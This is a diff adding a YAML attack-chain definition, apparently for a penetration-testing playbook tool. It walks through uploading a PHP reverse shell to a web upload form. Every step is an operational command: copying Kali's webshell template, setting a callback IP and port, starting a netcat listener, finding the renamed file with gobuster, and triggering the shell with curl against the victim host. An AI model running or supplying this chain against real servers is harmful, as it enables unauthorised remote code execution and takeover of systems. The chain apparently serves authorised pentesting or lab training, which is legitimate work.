@@ -1,0 +1,47 @@
+chain_id: php_webshell_upload
+title: "PHP reverse-shell upload via web form"
+severity: HIGH
+tags: [web, file-upload, php, webshell, reverse-shell]
+
+trigger:
+  any_of:
+    - { path_pattern: "(?i)/upload" }
+    - { path_in: ["/uploads", "/upload", "/files", "/file-upload"] }
+
+description: |
+  An upload endpoint was discovered. If the server runs PHP and accepts .php
+  uploads (or anything that aliases to PHP — .phtml, .phar, .php5), a
+  reverse shell drops in one HTTP request.
+
+steps:
+  - id: 1
+    title: "Copy Kali's webshell template"
+    command: cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+
+  - id: 2
+    title: "Edit IP and port by hand"
+    command: nano shell.php
+    notes: |
+      Find `$ip = '...'` and `$port = ...` and change them to
+      $ip='10.0.2.15'; $port=4444; Save with Ctrl+O, Enter, Ctrl+X.
+
+  - id: 3
+    title: "Verify the edit"
+    command: grep -E 'ip|port' shell.php | head -5
+
+  - id: 4
+    title: "Listener (separate terminal)"
+    command: nc -lvnp 4444
+
+  - id: 5
+    title: "Upload shell.php through the form"
+    notes: |
+      If the web app renames the file, find it with gobuster:
+        gobuster dir -u http://$VICTIMA/uploads/ -w /usr/share/wordlists/dirb/common.txt -x php
+
+  - id: 6
+    title: "Trigger the shell"
+    command: curl http://$VICTIMA/uploads/shell.php
+
+references:
+  - https://book.hacktricks.xyz/pentesting-web/file-upload
